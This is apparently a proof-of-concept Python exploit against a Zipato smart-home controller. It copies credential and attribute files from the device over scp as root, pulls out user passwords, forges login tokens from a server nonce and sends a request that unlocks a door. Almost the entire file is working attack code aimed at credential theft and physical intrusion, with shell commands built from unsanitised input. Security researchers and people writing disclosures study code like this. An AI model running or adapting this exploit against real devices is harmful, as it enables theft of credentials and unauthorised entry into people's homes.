#Written by Charles Dardaman

import requests
import hashlib
import sys
import os
import json
import subprocess
import logging

#Grab passwords and UUIDS
print("Stealing the files")

#trying with scp

#Grabbing files needed for UUID
cmd = "scp -i key root@" + sys.argv[1] + ":/mnt/data/zipato/storage/attributes.json ."
return_code = subprocess.call(cmd, shell=True)
if return_code != 0:
    print("Files not found")
    sys.exit()

#Grabbing files needed for token
cmd = "scp -r -i key root@" + sys.argv[1] + ":/mnt/data/zipato/storage/USERS/ ."
return_code = subprocess.call(cmd, shell=True)
if return_code != 0:
    print("Files not found")
    sys.exit()

#Open the files to parse the json to get the UUID, Username, and Password

print("Forging Keys")

with open("attributes.json") as f:
    data = json.load(f)
    for key in data:
        if key["name"] == "STATE":
            uuid = key["uuid"]
            print(uuid)

#Try for all the users
for root,dirs,files in os.walk("USERS"):
    for name in files:
        userpath = root + "/" + name
        with open(userpath) as f:
            data = json.load(f)
            try:
                username = data["name"]
                password = data["password"]
                print(username)
                print(password)
            except:
                break

            print("Building Crowbar")

            #Get nonce
            r = requests.get("http://" + sys.argv[1] + ":8080/v2/user/init")

            data = json.loads(r.text)
            nonce = data["nonce"]
            print("Nonce= " + nonce)
            jessionid = data["jsessionid"]
            cookies = {"JSESSIONID": jessionid}

            #SHA work SHA1(nonce+password=token)
            np = nonce + password
            print(np)

            hash_object = hashlib.sha1(np.encode())
            token = hash_object.hexdigest()
            print("token: "+ token)

            #Send Login Request
            r = requests.get("http://" + sys.argv[1] + ":8080/v2/user/login?username="+username+"&token="+token,cookies=cookies)

            print(r.text)
            data = json.loads(r.text)

            if data["success"] != "true":
                print("Pure Failure")

            #Send Open
            r = requests.put("http://" + sys.argv[1] + ":8080/v2/attributes/"+uuid+"/value",cookies=cookies,json={"value":"true"})

            print(r.text)
            print("Door Opened")